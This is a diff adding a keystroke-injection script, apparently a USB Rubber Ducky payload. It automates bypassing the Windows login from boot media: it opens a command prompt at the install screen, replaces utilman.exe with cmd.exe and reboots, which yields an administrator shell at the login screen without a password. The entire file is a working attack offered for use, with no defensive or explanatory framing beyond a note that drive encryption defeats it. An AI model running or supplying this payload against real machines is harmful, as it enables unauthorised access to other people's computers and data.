@@ -1,0 +1,36 @@
+REM Bypass Windows login using Windows boot media.
+REM This automates the commands used to rename the utilman.exe file to cmd.exe
+
+REM Author: emptythevoid
+
+REM Does not work if C: has full drive encryption enabled
+
+REM Run this when you see the first install screen
+
+REM == Bring up Terminal =====================
+SHIFT F10
+DELAY 1000
+
+REM == Change directory to system32:
+STRING C:
+ENTER
+DELAY 100
+STRING cd c:\windows\system32\
+ENTER
+DELAY 1000
+
+REM == Rename utilman.exe
+REM == By default, Windows will be on C:
+REM == Change the command below as needed
+STRING ren utilman.exe utilman2.exe
+ENTER
+DELAY 1000
+
+REM == Copy the cmd.exe into utilman.exe
+STRING copy cmd.exe utilman.exe
+ENTER
+DELAY 1000
+
+REM == Reboot
+STRING shutdown /r /t 0
+ENTER
